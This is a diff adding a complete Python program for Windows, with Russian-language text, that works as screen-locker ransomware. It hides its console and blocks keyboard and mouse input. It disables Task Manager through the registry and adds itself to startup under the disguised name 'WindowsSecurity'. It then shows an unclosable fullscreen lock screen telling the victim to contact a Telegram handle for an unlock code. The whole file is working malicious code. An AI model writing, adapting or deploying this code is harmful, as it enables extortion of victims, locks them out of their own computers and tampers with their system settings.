@@ -1,0 +1,131 @@
+import tkinter as tk
+import ctypes
+import os
+import sys
+import winreg
+
+# Скрыть консоль
+ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+# Код разблокировки
+UNLOCK_CODE = "148852"
+password_input = ""
+unlocked = False
+
+# Блокировка ввода
+def block_input(block=True):
+    ctypes.windll.user32.BlockInput(block)
+
+# Проверка пароля
+def check_password(event=None):
+    global password_input, unlocked
+    if password_input == UNLOCK_CODE:
+        unlocked = True
+        block_input(False)
+        os._exit(0)
+    else:
+        password_input = ""
+        error_label.config(text="❌ НЕВЕРНЫЙ КОД ❌")
+        root.after(1500, lambda: error_label.config(text=""))
+
+def on_key(event):
+    global password_input
+    if unlocked:
+        return
+    if event.char.isdigit():
+        password_input += event.char
+        display_label.config(text="🔒 " + "•" * len(password_input))
+    elif event.keysym == 'BackSpace':
+        password_input = password_input[:-1]
+        display_label.config(text="🔒 " + "•" * len(password_input))
+    elif event.keysym == 'Return':
+        check_password()
+
+# Отключение диспетчера задач
+def disable_task_manager():
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+        new_key = winreg.CreateKey(key, subkey)
+        winreg.SetValueEx(new_key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(new_key)
+    except:
+        pass
+
+# Автозапуск
+def add_to_startup():
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        new_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(new_key, "WindowsSecurity", 0, winreg.REG_SZ, sys.executable)
+        winreg.CloseKey(new_key)
+    except:
+        pass
+
+# Создание окна блокировки
+def create_block_window():
+    global root, display_label, error_label
+    
+    root = tk.Tk()
+    root.attributes('-fullscreen', True)
+    root.attributes('-topmost', True)
+    root.configure(bg='#0a0a0a')
+    root.overrideredirect(True)
+    
+    # Контейнер
+    frame = tk.Frame(root, bg='#0a0a0a')
+    frame.pack(expand=True)
+    
+    # Заголовок
+    title = tk.Label(frame, text="⚠️ ВАШ ПК ЗАБЛОКИРОВАН ⚠️",
+                     font=('Arial', 32, 'bold'), fg='#ff3333', bg='#0a0a0a')
+    title.pack(pady=20)
+    
+    # Сообщение о выкупе
+    ransom_text = """🔒 Ваш компьютер полностью заблокирован 🔒
+
+Для разблокировки обратитесь к администратору:
+
+📩 Telegram: @kirkypa
+
+Введите код разблокировки в поле ниже:"""
+    
+    msg_label = tk.Label(frame, text=ransom_text, font=('Arial', 14),
+                         fg='white', bg='#0a0a0a', justify='center')
+    msg_label.pack(pady=30)
+    
+    # Поле для ввода кода
+    display_label = tk.Label(frame, text="🔒 ",
+                             font=('Arial', 20, 'bold'), fg='#00ff00', bg='#0a0a0a')
+    display_label.pack(pady=20)
+    
+    error_label = tk.Label(frame, text="", font=('Arial', 12),
+                           fg='#ff6666', bg='#0a0a0a')
+    error_label.pack()
+    
+    # Подсказка
+    hint_label = tk.Label(frame, text="Введите 6-значный код и нажмите Enter",
+                          font=('Arial', 10), fg='#666666', bg='#0a0a0a')
+    hint_label.pack(pady=20)
+    
+    # Привязка клавиш
+    root.bind('<Key>', on_key)
+    
+    return root
+
+if __name__ == "__main__":
+    # Блокируем всё
+    block_input(True)
+    disable_task_manager()
+    add_to_startup()
+    
+    # Запускаем окно
+    root = create_block_window()
+    
+    # Защита от закрытия
+    def on_closing():
+        pass
+    
+    root.protocol("WM_DELETE_WINDOW", on_closing)
+    root.mainloop()
